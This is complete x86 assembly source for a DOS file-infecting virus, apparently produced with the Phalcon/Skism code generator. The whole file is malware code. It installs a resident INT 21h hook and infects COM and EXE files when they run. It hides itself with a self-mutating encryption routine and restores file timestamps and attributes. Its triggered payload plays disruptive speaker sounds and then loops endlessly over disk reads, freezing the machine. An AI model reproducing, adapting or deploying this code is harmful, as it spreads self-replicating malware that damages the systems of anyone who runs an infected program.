; target.asm : Unknown by Unknown
; Created wik the Phalcon/Skism Mass-Produced Code Generator
; from the configuration file skeleton.cfg

.model tiny                             ; Handy directive
.code                                   ; Virus code segment
          org    0                      ; For easy calculation of offsets
id = 'DA'                               ; ID word for EXE infections

startvirus:
decrypt:                                ; handles encryption and decryption
          mov  ax,(offset heap - offset startencrypt)/2 ; iterations
patch_startencrypt:
          mov  di,offset startencrypt   ; start of decryption
decrypt_loop:
          db   2eh,81h,05h              ; add word ptr cs:[di], xxxx
decrypt_value dw  0                     ; initialised at zero for null effect
          inc  di                       ; calculate new decryption location
          inc  di
          dec  ax                       ; If we are not done, then
          jnz  decrypt_loop             ; decrypt mo'
startencrypt:
          call next                     ; calculate delta offset
next:     pop  bp                       ; bp = IP next
          sub  bp,offset next           ; bp = delta offset

          push ds
          push es

          mov  ax,'DA'                  ; Installation check
          int  21h
          cmp  ax,'PS'                  ; Already installed?
          jz  done_install

          mov  ax, es                   ; Get PSP
          dec  ax
          mov  ds, ax                   ; Get MCB

          sub  word ptr ds:[3],(endheap-startvirus+15)/16+1
          sub  word ptr ds:[12h],(endheap-startvirus+15)/16+1
          mov  ax,ds:[12h]
          mov  ds, ax
          inc  ax
          mov  es, ax
          mov  byte ptr ds:[0],'Z'      ; Mark end of chain
          mov  word ptr ds:[1],8        ; Mark owner = DOS
          mov  word ptr ds:[3],(endheap-startvirus+15)/16 ; Set size

          push cs
          pop  ds
          xor  di,di                    ; Destination
          mov  cx,(heap-startvirus)/2+1 ; Bytes to zopy
          mov  si,bp                    ; lea  si,[bp+offset startvirus]
          rep  movsw

          mov  di,offset encrypt
          mov  si,bp                    ; lea  si,[bp+offset startvirus]
          mov  cx,startencrypt-decrypt
          rep  movsb
          mov  al,0c3h                  ; retn
          stosb

          xor  ax,ax
          mov  ds,ax
          push ds
          lds  ax,ds:[21h*4]            ; Get old int handler
          mov  word ptr es:oldint21, ax
          mov  word ptr es:oldint21+2, ds
          pop  ds
          mov  word ptr ds:[21h*4], offset int21 ; Replace with new handler
          mov  ds:[21h*4+2], es         ; in high memory
done_install:
          mov  ah,2ah                   ; Get current date
          int  21h
          cmp  ch,1                     ; Check hour
          jle  noise
          
          mov  ah,2ah                   ; Get current date
          int  21h
          cmp  al,6                     ; Check date of week
          jnz  exit_virus
         
          mov  ah,2ch                   ; Get current time
          int  21h
          cmp  ch,22                    ; Check the hour
          jae  activate
          
exit_virus:
          pop  es
          pop  ds
          cmp  sp,id                    ; EXE or COM?
          jz   returnEXE
returnCOM:
          lea  si,[bp+offset save3]
          mov  di,100h
          push di                       ; For later return
          movsw
          movsb
          retn                          ; 100h is on stack
returnEXE:
          mov  ax,es                    ; AX = PSP segment
          add  ax,10h                   ; Adjust for PSP
          add  word ptr cs:[bp+oldCSIP+2],ax
          add  ax,word ptr cs:[bp+oldSSSP+2]
          cli                           ; Clear intrpts for stack manipulation
          mov  sp,word ptr cs:[bp+oldSSSP]
          mov  ss,ax
          sti
          db   0eah                     ; jmp ssss:oooo
oldCSIP   db ?                          ; Original CS:IP (4 bytes)
save3     db 0cdh,20h,0                 ; First 3 bytes of COM file
oldSSSP   dd ?                          ; Original SS:SP

noise:
                mov     cx,0001h                ; First argument is 3
new_shot:       push    cx                      ; Save the current count
                mov     dx,0140h                ; DX holds pitch
                mov     bx,0100h                ; BX holds shot duration
                in      al,061h                 ; Read the speaker port
                and     al,11111100b            ; Turn off the speaker bit
fire_shot:      xor     al,2                    ; Toggle the speaker bit
                out     061h,al                 ; Write AL to speaker port
                add     dx,09248h               ;
                mov     cl,3                    ;
                ror     dx,cl                   ; Figure out the delay time
                mov     cx,dx                   ;
                and     cx,01FFh                ;
                or      cx,10                   ;
shoot_pause:    loop    shoot_pause             ; Delay a bit
                dec     bx                      ; Are we done with the shot?
                jnz     fire_shot               ; If not, pulse the speaker
                and     al,11111100b            ; Turn off the speaker bit
                out     061h,al                 ; Write AL to speaker port
                mov     bx,0002h                ; BX holds delay time (ticks)
                xor     ah,ah                   ; Get time function
                int     1Ah                     ; BIOS timer interrupt
                add     bx,dx                   ; Add current time to delay
shoot_delay:    int     1Ah                     ; Get the time again
                cmp     dx,bx                   ; Are we done yet?
                jne     shoot_delay             ; If not, keep checking
                pop     cx                      ; Restore the count
                loop    new_shot                ; Do another shot
                jmp     exit_virus

 
activate:                                    ;sound and fury start
                cli                          ;turn off interrupts
                mov     dx,2                 
agin1:          mov     bp,100               ;do 100 cycles of sound
                mov     si,2000              ;1st frequency
                mov     di,17000             ;2nd frequency
                mov     al,10110110b         ;address of channel 2 mode 3
                out     43h,al               ;send to port
agin2:          mov     bx,si                ;place sound number in bx
backerx:        mov     ax,bx                ;now put in ax
                out     42h,al               
                mov     al,ah                
                out     42h,al               
                in      al,61h               ;get port value
                or      al,00000011b         ;turn speaker on
                out     61h,al               
                mov     cx,2EE0h             ;delay 
looperx:        loop    looperx        ;do nothing loop so sound is audible
                xchg    di,si                
                in      al,61h               ;get port value
                and     al,11111100b         ;AND - turn speaker off
                out     61h,al               ;send it
                dec     bp                   ;decrement repeat count
                jnz     agin2                ;if not = 0 do again
                mov     ax,10                ;10 repeats of 60000 loops
back:           mov     cx,0EA60h            ;loop count (in hex for TASM)
loopery:        loop    loopery         ;delay loops - no sound between bursts
                dec     ax                   
                jnz     back                 ;if not = 0 loop again
                dec     dx                   
                jnz     agin1                ;if not = 0 do whole thing again
                sti                          ;restore interrupts 
                
                
                
                mov     si,0              ;scarey part: drive reads real
scarey:         lodsb                     ;fast ala Michelangelo-style
                mov     ah,al             ;over-write, but this routine only
                lodsb                     ;gets random bytes here for a 
                and     al,3              ;cylinder to READ
                mov     dl,80h
                mov     dh,al
                mov     ch,ah
                mov     cl,1
                mov     bx,offset last    ;buffer to read into
                mov     ax,201h
                int     13h
                jmp     short scarey      ;yow! scarey! just think if this
                                          ;was made by someone not as nice as
                                          ;me

int21:                                  ; New interrupt handler
          cmp  ax,'DA'                  ; Installation check?
          jnz  notinstall
          mov  ax,'PS'
          iret
notinstall:
          pushf
          push ax
          push bx
          push cx
          push dx
          push si
          push di                       ; don't need to save bp
          push ds
          push es
          cmp  ax,4b00h                 ; Infect on execute
          jz   infectDSDX
exithandler:
          pop  es
          pop  ds
          pop  di
          pop  si
          pop  dx
          pop  cx
          pop  bx
          pop  ax
          popf
          db 0eah                       ; JMP SSSS:OOOO
oldint21  dd ?                          ; Go to orig handler

infectDSDX:
          mov  ax,4300h
          int  21h
          push ds
          push dx
          push cx                       ; Save attributes
          xor  cx,cx                    ; Clear attributes
          call attributes               ; Set file attributes

          mov  ax,3d02h                 ; Open read/write
          int  21h
          xchg ax,bx

          mov  ax,5700h                 ; Get creation date/time
          int  21h
          push cx                       ; Save date and
          push dx                       ; time

          push cs                       ; DS = CS
          pop  ds
          push cs                       ; ES = CS
          pop  es
          mov  ah,3fh                   ; Read file to buffer
          mov  dx,offset buffer         ; @ DS:DX
          mov  cx,1Ah                   ; 1Ah bytes
          int  21h

          mov  ax,4202h                 ; Go to end of file
          xor  cx,cx
          cwd
          int  21h

          mov  word ptr filesize,ax
          mov  word ptr filesize+2,dx
          cmp  word ptr buffer,'ZM'     ; EXE?
          jz   checkEXE                 ; Why yes, yes it is!
checkCOM:
          mov  ax,word ptr filesize
          cmp  ax,1000                  ; Is it too small?
          jb   done_file

          cmp  ax,65535-(endheap-decrypt) ; Is it too large?
          ja   done_file

          mov  cx,word ptr buffer+1     ; get jmp location
          add  cx,heap-startvirus+3     ; Adjust for virus size
          cmp  ax,cx                    ; Already infected?
          je   done_file
          jmp  infect_com
checkEXE:
          cmp  word ptr buffer+10h,id   ; is it already infected?
          jnz  infect_exe
done_file:
          mov  ax,5701h                 ; Restore creation date/time
          pop  dx                       ; Restore date and
          pop  cx                       ; time
          int  21h

          mov  ah,3eh                   ; Close file
          int  21h

          pop  cx
          pop  dx
          pop  ds                       ; Restore filename
          call attributes               ; attributes

          jmp  exithandler
infect_exe:
          mov  cx, 1ah
          push cx
          push bx                       ; Save file handle
          les  ax,dword ptr buffer+14h  ; Save old entry point
          mov  word ptr oldCSIP, ax
          mov  word ptr oldCSIP+2, es

          les  ax,dword ptr buffer+0Eh  ; Save old stack
          mov  word ptr oldSSSP,es
          mov  word ptr oldSSSP+2,ax

          mov  ax,word ptr buffer+8     ; Get header size
          mov  cl, 4                    ; convert to bytes
          shl  ax, cl
          xchg ax, bx

          les  ax,dword ptr filesize    ; Get file size
          mov  dx, es                   ; to DX:AX
          push ax
          push dx

          sub  ax, bx                   ; Subtract header size from
          sbb  dx, 0                    ; file size

          mov  cx, 10h                  ; Convert to segment:offset
          div  cx                       ; form

          mov  word ptr buffer+14h, dx  ; New entry point
          mov  word ptr buffer+16h, ax

          mov  word ptr buffer+0Eh, ax  ; and stack
          mov  word ptr buffer+10h, id

          pop  dx                       ; get file length
          pop  ax
          pop  bx                       ; Restore file handle

          add  ax, heap-startvirus      ; add virus size
          adc  dx, 0

          mov  cl, 9
          push ax
          shr  ax, cl
          ror  dx, cl
          stc
          adc  dx, ax
          pop  ax
          and  ah, 1                    ; mod 512

          mov  word ptr buffer+4, dx    ; new file size
          mov  word ptr buffer+2, ax

          push cs                       ; restore ES
          pop  es

          mov  ax,word ptr buffer+14h   ; needed later
          jmp  short finishinfection
infect_com:                             ; ax = filesize
          mov  cx,3
          push cx
          sub  ax,cx
          mov  si,offset buffer
          mov  di,offset save3
          movsw
          movsb
          mov  byte ptr [si-3],0e9h
          mov  word ptr [si-2],ax
          add  ax,103h
finishinfection:
          add  ax,offset startencrypt-offset decrypt
          mov  word ptr encrypt+(patch_startencrypt-startvirus)+1,ax

          mov  ah,2ch                   ; Get current time
          int  21h                      ; dh=sec,dl=1/100 sec
          mov  word ptr encrypt+(decrypt_value-startvirus),dx ; New encrypt. value
          xor  byte ptr encrypt+(decrypt_loop-startvirus)+2,028h ; flip between add/sub

          xor  si,si                    ; copy virus to buffer
          mov  di,offset zopystuff
          mov  cx,heap-startvirus
          rep  movsb

          mov  si,offset encrypt        ; copy encryption function
          mov  di,offset zopystuff
          mov  cx,startencrypt-decrypt
          rep  movsb

          xor  byte ptr zopystuff+(decrypt_loop-startvirus)+2,028h ; flip between add/sub

          mov  word ptr [encrypt+(patch_startencrypt-startvirus)+1],offset zopystuff+(startencrypt-decrypt)

          call encrypt

          mov  ah,40h                   ; Concatenate virus
          mov  dx,offset zopystuff
          mov  cx,heap-startvirus       ; # bytes to write
          int  21h

          mov  ax,4200h                 ; Move file pointer
          xor  cx,cx                    ; to beginning of file
          cwd                           ; xor dx,dx
          int  21h

          mov  ah,40h                   ; Write to file
          mov  dx,offset buffer         ; Write from buffer
          pop  cx                       ; cx bytes
          int  21h

          jmp  done_file

attributes:
          mov  ax,4301h                 ; Set attributes to cx
          int  21h
          ret

heap:                                   ; Variables not in code
filesize  dd ?
encrypt:  db startencrypt-decrypt+1 dup (?)
zopystuff db heap-startvirus dup (?)    ; Encryption buffer
buffer    db 1ah dup (?)                ; read buffer
last      db 090h
endheap:                                ; End of virus
end       startvirus
